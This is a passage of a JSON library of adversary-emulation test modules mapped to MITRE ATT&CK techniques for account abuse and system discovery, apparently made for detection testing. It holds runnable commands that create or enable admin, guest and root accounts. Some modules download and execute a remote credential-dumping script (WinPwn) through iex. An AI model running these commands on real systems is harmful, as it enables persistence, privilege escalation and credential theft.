        "cleanup_command": "net user #{guest_user} /active:no >nul 2>&1\nnet localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)"
      },
      "variables": [
        {
          "name": "guest_user",
          "description": "Specify the guest account",
          "type": "string",
          "default_value": "guest"
        },
        {
          "name": "guest_password",
          "description": "Specify the guest password",
          "type": "string",
          "default_value": "Password123!"
        },
        {
          "name": "local_admin_group",
          "description": "Specify the admin localgroup name",
          "type": "string",
          "default_value": "Administrators"
        },
        {
          "name": "remote_desktop_users_group_name",
          "description": "Specify the remote desktop users group name",
          "type": "string",
          "default_value": "Remote Desktop Users"
        },
        {
          "name": "remove_rdp_access_during_cleanup",
          "description": "Set to 1 if you want the cleanup to remove RDP access to machine",
          "type": "integer",
          "default_value": 0
        }
      ],
      "prerequisites": [],
      "rx_module_id": "99747561-ed8d-47f2-9c91-1e5fde1ed6e0",
      "module_name": "Enable Guest account with RDP capability and admin privileges"
    },
    {
      "index": 497,
      "technique_id": "T1078.001",
      "technique_name": "Valid Accounts: Default Accounts",
      "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user #{guest_user} /active:yes\n",
        "elevation_required": true,
        "cleanup_command": "net user #{guest_user} /active:no\n"
      },
      "variables": [
        {
          "name": "guest_user",
          "description": "Specify the guest account",
          "type": "string",
          "default_value": "guest"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "aa6cb8c4-b582-4f8e-b677-37733914abda",
      "module_name": "Activate Guest Account"
    },
    {
      "index": 498,
      "technique_id": "T1078.001",
      "technique_name": "Valid Accounts: Default Accounts",
      "description": "This test enables the guest account on macOS using sysadminctl utility.",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo sysadminctl -guestAccount on",
        "elevation_required": true,
        "cleanup_command": "sudo sysadminctl -guestAccount off"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0315bdff-4178-47e9-81e4-f31a6d23f7e4",
      "module_name": "Enable Guest Account on macOS"
    },
    {
      "index": 499,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "After execution the new account will be active and added to the Administrators group",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user art-test /add\nnet user art-test #{password}\nnet localgroup administrators art-test /add",
        "elevation_required": true,
        "cleanup_command": "net localgroup administrators art-test /delete >nul 2>&1\nnet user art-test /delete >nul 2>&1"
      },
      "variables": [
        {
          "name": "password",
          "description": "Password for art-test user",
          "type": "string",
          "default_value": "-4RTisCool!-321"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a524ce99-86de-4db6-b4f9-e08f35a47a15",
      "module_name": "Create local account with admin privileges"
    },
    {
      "index": 500,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "After execution the new account will be active and added to the Administrators group",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "dscl . -create /Users/RAGLOXUser\ndscl . -create /Users/RAGLOXUser UserShell /bin/bash\ndscl . -create /Users/RAGLOXUser RealName \"RAGLOX User\"\ndscl . -create /Users/RAGLOXUser UniqueID 503\ndscl . -create /Users/RAGLOXUser PrimaryGroupID 503\ndscl . -create /Users/RAGLOXUser NFSHomeDirectory /Local/Users/RAGLOXUser\ndscl . -passwd /Users/RAGLOXUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership RAGLOXUser",
        "elevation_required": true,
        "cleanup_command": "sudo dscl . -delete /Users/RAGLOXUser"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f1275566-1c26-4b66-83e3-7f9f7f964daa",
      "module_name": "Create local account with admin privileges - MacOS"
    },
    {
      "index": 501,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "After execution the new account will be active and added to the Administrators group",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin",
        "elevation_required": true,
        "cleanup_command": "sysadminctl interactive -deleteUser art-tester"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "191db57d-091a-47d5-99f3-97fde53de505",
      "module_name": "Create local account with admin privileges using sysadminctl utility - MacOS"
    },
    {
      "index": 502,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "After execution the current/new user will have root access",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user",
        "elevation_required": true,
        "cleanup_command": "dsenableroot -d #current user\ndsenableroot -d -u art-tester -p art-tester #new user"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "20b40ea9-0e17-4155-b8e6-244911a678ac",
      "module_name": "Enable root account using dsenableroot utility - MacOS"
    },
    {
      "index": 503,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "After execution the current/new user will be added to the Admin group",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "dseditgroup -o edit -a art-user -t user admin",
        "elevation_required": true,
        "cleanup_command": "dseditgroup -o edit -d art-user -t user admin"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "433842ba-e796-4fd5-a14f-95d3a1970875",
      "module_name": "Add a new/existing user to the admin group using dseditgroup utility - macOS"
    },
    {
      "index": 504,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9e9fd066-453d-442f-88c1-ad7911d32912",
      "module_name": "WinPwn - Loot local Credentials - powerhell kittie"
    },
    {
      "index": 505,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e9fdb899-a980-4ba4-934b-486ad22e22f4",
      "module_name": "WinPwn - Loot local Credentials - Safetykatz"
    },
    {
      "index": 506,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n",
        "elevation_required": true,
        "cleanup_command": "[ \"$(uname)\" = 'Linux' ] && userdel art -rf || rmuser -y art\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "02a91c34-8a5b-4bed-87af-501103eb5357",
      "module_name": "Create local account (Linux)"
    },
    {
      "index": 507,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu -c whoami art\n",
        "elevation_required": true,
        "cleanup_command": "userdel -r art \n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d2b95631-62d7-45a3-aaef-0972cea97931",
      "module_name": "Reactivate a locked/expired account (Linux)"
    },
    {
      "index": 508,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n",
        "elevation_required": true,
        "cleanup_command": "rmuser -y art \n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "09e3380a-fae5-4255-8b19-9950be0252cf",
      "module_name": "Reactivate a locked/expired account (FreeBSD)"
    },
    {
      "index": 509,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cat /etc/passwd |grep nobody\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu -c \"whoami\" nobody\n",
        "elevation_required": true,
        "cleanup_command": "chsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep nobody\n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3d2cd093-ee05-41bd-a802-59ee5c301b85",
      "module_name": "Login as nobody (Linux)"
    },
    {
      "index": 510,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin`\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat /etc/passwd |grep nobody\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n",
        "elevation_required": true,
        "cleanup_command": "pw usermod nobody -s /usr/sbin/nologin\ncat /etc/passwd |grep nobody\n# -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "16f6374f-7600-459a-9b16-6a88fd96d310",
      "module_name": "Login as nobody (freebsd)"
    },
    {
      "index": 511,
      "technique_id": "T1078.003",
      "technique_name": "Valid Accounts: Local Accounts",
      "description": "PsExec is a powerful tool most known for its remote management capability. However, it can also be used to run processes as the local system account.\n\nThe local system account is a default windows account which has unrestricted access to all system resources.\n\nUpon successful execution, PsExec.exe will spawn a command prompt which will run 'whoami' as the local system account and then exit.    \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
        }
      ],
      "rx_module_id": "6904235f-0f55-4039-8aed-41c300ff7733",
      "module_name": "Use PsExec to elevate to NT Authority\\SYSTEM account"
    },
    {
      "index": 512,
      "technique_id": "T1078.004",
      "technique_name": "Valid Accounts: Cloud Accounts",
      "description": "GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.\n",
      "execution": {
        "platforms": [
          "google-workspace",
          "iaas:gcp"
        ],
        "executor_type": "sh",
        "command": "gcloud config set project #{project-id}\ngcloud iam service-accounts create #{service-account-name}\ngcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}\n",
        "elevation_required": false,
        "cleanup_command": "gcloud iam service-accounts delete #{service-account-email} --quiet\n"
      },
      "variables": [
        {
          "name": "project-id",
          "description": "ID of the project, you want to create service account as well as service account key for",
          "type": "string",
          "default_value": "art-project-1"
        },
        {
          "name": "service-account-name",
          "description": "Name of the service account",
          "type": "string",
          "default_value": "gcp-art-service-account-1"
        },
        {
          "name": "service-account-email",
          "description": "Email of the service account",
          "type": "string",
          "default_value": "gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com"
        },
        {
          "name": "output-key-file",
          "description": "Email of the service account",
          "type": "string",
          "default_value": "gcp-art-service-account-1.json"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires gcloud\n",
          "check_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Please Install Google Cloud SDK before running this RAGLOX module : https://cloud.google.com/sdk/docs/install\"\n"
        },
        {
          "description": "Check if user is logged in \n",
          "check_command": "gcloud config get-value account\n",
          "install_command": "gcloud auth login --no-launch-browser\n"
        }
      ],
      "rx_module_id": "9fdd83fd-bd53-46e5-a716-9dec89c8ae8e",
      "module_name": "Creating GCP Service Account and Service Account Key"
    },
    {
      "index": 513,
      "technique_id": "T1078.004",
      "technique_name": "Valid Accounts: Cloud Accounts",
      "description": "Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure\nAutomation runbook to execute malicious code and maintain persistence in their target's environment.\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force\nRemove-AzAutomationAccount -ResourceGroupName #{resource_group} -Name #{automation_account_name} -Force\nRemove-AzResourceGroup -Name #{resource_group} -Force\necho \"Cleanup should be completed. Run 'terraform destroy` to ensure remaining resources are also deleted.\"\ncd \"$PathToRagloxModulesFolder/T1078.004/src/T1078.004-2/\"\nterraform destroy -auto-approve\n"
      },
      "variables": [
        {
          "name": "resource_group",
          "description": "Name of the resource group",
          "type": "string",
          "default_value": "ART-ResourceGroupName-T1078-004"
        },
        {
          "name": "runbook_name",
          "description": "Name of the runbook name",
          "type": "string",
          "default_value": "ART-RunbookName-T1078-004"
        },
        {
          "name": "automation_account_name",
          "description": "Name of the automation account name",
          "type": "string",
          "default_value": "ART-AutomationAccountName-T1078-004"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if terraform is installed.\n",
          "check_command": "terraform version\n",
          "install_command": "echo \"Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli (URL accurate as of Nov. 15, 2024).\"\n"
        },
        {
          "description": "Check if Azure CLI and Azure Powershell are installed.\n\n* Login to Azure CLI with \"az login\", and login to Azure Powershell with \"Connect-AzAccount\". Sessions are not shared.\n* Azure Powershell used in this test as they have better automation performance and error logging than Azure CLI.\n",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\n"
        },
        {
          "description": "Check if the user is logged into Azure.\n",
          "check_command": "try {if (-not (Get-AzContext)) { exit 1 } else { exit 0 }} catch {exit 1}\n",
          "install_command": "echo \"* Configure your Azure account using: Connect-AzAccount\"\n"
        },
        {
          "description": "Create dependency resources using terraform\n\n* If fail to meet prereq, navigate to T1078.004-2 using \"cd $PathToRagloxModulesFolder/T1078.004/src/T1078.004-2/\"\n* Open the \"terraform.tfvars\" file and fill in the variables with your desired values.\n* Re-run -GetPrereqs\n",
          "check_command": "try {if (Test-Path \"$PathToRagloxModulesFolder/T1078.004/src/T1078.004-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n",
          "install_command": "echo \"Navigating to: $PathToRagloxModulesFolder/T1078.004/src/T1078.004-2/\"\ncd \"$PathToRagloxModulesFolder/T1078.004/src/T1078.004-2/\"\nterraform init\nterraform apply -auto-approve\n"
        }
      ],
      "rx_module_id": "348f4d14-4bd3-4f6b-bd8a-61237f78b3ac",
      "module_name": "Azure Persistence Automation Runbook Created or Modified"
    },
    {
      "index": 514,
      "technique_id": "T1078.004",
      "technique_name": "Valid Accounts: Cloud Accounts",
      "description": "This raglox will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this RAGLOX came from a Rule published by the Elastic team.\n\nIdentifies an Identity and Access Management (IAM) custom role creation in Google Cloud Platform (GCP). \nCustom roles are user-defined, and allow for the bundling of one or more supported permissions to meet specific needs. \nCustom roles will not be updated automatically and could lead to privilege creep if not carefully scrutinized.\n\nThis raglox will create a new IAM role. The default role permissions are: *IAM Service Account Get*\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/initial_access_gcp_iam_custom_role_creation.toml\n",
      "execution": {
        "platforms": [
          "iaas:gcp"
        ],
        "executor_type": "sh",
        "command": "gcloud config set project #{project-id}\ngcloud iam roles create #{role-name} --description=\"#{role-description}\" --permissions=#{roles} --project=#{project-id}\n",
        "elevation_required": false,
        "cleanup_command": "gcloud iam roles delete #{role-name} --project=#{project-id}\n"
      },
      "variables": [
        {
          "name": "project-id",
          "description": "ID of the GCP Project you to execute the command against.",
          "type": "string",
          "default_value": "raglox-test-1"
        },
        {
          "name": "role-name",
          "description": "The name of the role to be created.",
          "type": "string",
          "default_value": "RAGLOXRedTeamRole"
        },
        {
          "name": "role-description",
          "description": "The description of the role to be created.",
          "type": "string",
          "default_value": "RAGLOX Threat Library Custom IAM Role"
        },
        {
          "name": "roles",
          "description": "List of roles to be applied",
          "type": "string",
          "default_value": "iam.serviceAccounts.get"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires gcloud\n",
          "check_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Please Install Google Cloud SDK before running this RAGLOX module : https://cloud.google.com/sdk/docs/install\"\n"
        },
        {
          "description": "Check if user is logged in \n",
          "check_command": "gcloud config get-value account\n",
          "install_command": "gcloud auth login --no-launch-browser\n"
        }
      ],
      "rx_module_id": "3a159042-69e6-4398-9a69-3308a4841c85",
      "module_name": "GCP - Create Custom IAM Role"
    },
    {
      "index": 515,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "66703791-c902-4560-8770-42b8a91f7667",
      "module_name": "System Information Discovery"
    },
    {
      "index": 516,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify System Info\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "system_profiler\nls -al /Applications\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "edff98ec-0f73-4f63-9890-6b117092aff6",
      "module_name": "System Information Discovery"
    },
    {
      "index": 517,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify System Info\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file used to store the results.",
          "type": "path",
          "default_value": "/tmp/T1082.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cccb070c-df86-4216-a5bc-9fb60c74e27c",
      "module_name": "List OS Information"
    },
    {
      "index": 518,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "31dad7ad-2286-4c02-ae92-274418c85fec",
      "module_name": "Linux VM Check via Hardware"
    },
    {
      "index": 519,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8057d484-0fae-49a4-8302-4812c4f1e64e",
      "module_name": "Linux VM Check via Kernel Modules"
    },
    {
      "index": 520,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify virtual machine host kernel modules.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "kldstat | grep -i \"vmm\"\nkldstat | grep -i \"vbox\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "eefe6a49-d88b-41d8-8fc2-b46822da90d3",
      "module_name": "FreeBSD VM Check via Kernel Modules"
    },
    {
      "index": 521,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "hostname\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "85cfbf23-4a1e-4342-8792-007e004b975f",
      "module_name": "Hostname Discovery (Windows)"
    },
    {
      "index": 522,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify system hostname for FreeBSD, Linux and macOS systems.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "hostname\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "486e88ea-4f56-470f-9b57-3f4d73f39133",
      "module_name": "Hostname Discovery"
    },
    {
      "index": 523,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "224b4daf-db44-404e-b6b2-f4d1f0126ef8",
      "module_name": "Windows MachineGUID Discovery"
    },
    {
      "index": 524,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cscript \"#{vbscript}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vbscript",
          "description": "Path to sample script",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1082\\src\\griffon_recon.vbs"
        }
      ],
      "prerequisites": [
        {
          "description": "Sample script file must exist on disk at specified location (#{vbscript})\n",
          "check_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{vbscript}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1082/src/griffon_recon.vbs\" -OutFile \"#{vbscript}\"\n"
        }
      ],
      "rx_module_id": "69bd4abe-8759-49a6-8d21-0f15822d6370",
      "module_name": "Griffon Recon"
    },
    {
      "index": 525,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "set\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f400d1c0-1804-4ff8-b069-ef5ddd2adbf3",
      "module_name": "Environment variables discovery on windows"
    },
    {
      "index": 526,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "env\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fcbdd43f-f4ad-42d5-98f3-0218097e2720",
      "module_name": "Environment variables discovery on freebsd, macos and linux"
    },
    {
      "index": 527,
      "technique_id": "T1082",
